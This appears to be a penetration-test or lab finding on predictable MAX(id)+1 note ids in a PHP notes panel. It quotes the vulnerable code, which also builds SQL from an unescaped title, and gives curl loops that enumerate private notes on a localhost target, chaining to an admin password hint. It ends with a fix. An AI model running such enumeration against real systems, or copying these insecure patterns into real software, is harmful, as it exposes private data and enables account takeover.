# 09 — Predictable sequential note ids

- **OWASP Top 10 (2021):** A04:2021 – Insecure Design
- **Severity:** Low
- **Difficulty:** Easy

## Where

`web/panel/notes.php:29-32` — new-note creation:

```php
$r = mysqli_query($db, 'SELECT MAX(id) as m FROM notes');
$m = mysqli_fetch_assoc($r);
$next = (int)$m['m'] + 1;
mysqli_query($db, 'INSERT INTO notes (id, user_id, title, body, created_at)
  VALUES (' . $next . ', ' . (int)$me['id'] . ', \'' . $title . '\', ...'
```

## How it works (root cause)

New note ids are assigned as `MAX(id) + 1` — a plain counter, not a random
token. The identifier for a private resource is therefore **predictable and
enumerable**. On its own this is low impact; it is the *design* flaw that
makes the IDOR in 08 trivially exploitable at scale.

## Exploitation steps

1. Read any note without knowing its id (just walk the counter):

   ```bash
   for id in 140 143 147 151 156 159 164 168; do
     echo "== id=$id =="
     curl -s "http://localhost:8080/panel/notes.php?action=view&id=$id" \
       | grep -o '<h1>.*</h1>'
   done
   ```

2. Or discover the current max and probe upward:

   ```bash
   curl -s 'http://localhost:8080/panel/notes.php?action=view&id=1000'
   # "Ingen notis med den id:n" → binary-search downward to find the range
   ```

## Working PoC (verified)

The seeded ids are exactly sequential with small gaps (140, 143, 147, 151,
156, 159, 164, 168). Every value in the range that exists returns its
content; missing values return "Ingen notis med den id:n". A single
`for`/`seq` loop over a 20-id window enumerates every private note in the
system without authentication.

## Expected result / verification

- Walking a short id range enumerates all notes, including the admin-only
  note 159.
- No per-user scoping is applied to the read (see 08).

## Attack chain

```
sequential, predictable ids
  → combined with 08 (unauthenticated read) → full enumeration of every
    user's private notes
  → note 159 → admin password hint → admin account
```

## Notes

- Correct design: random, high-entropy note ids (or UUIDs) **plus** a
  `WHERE user_id = :me` scope check on every read.
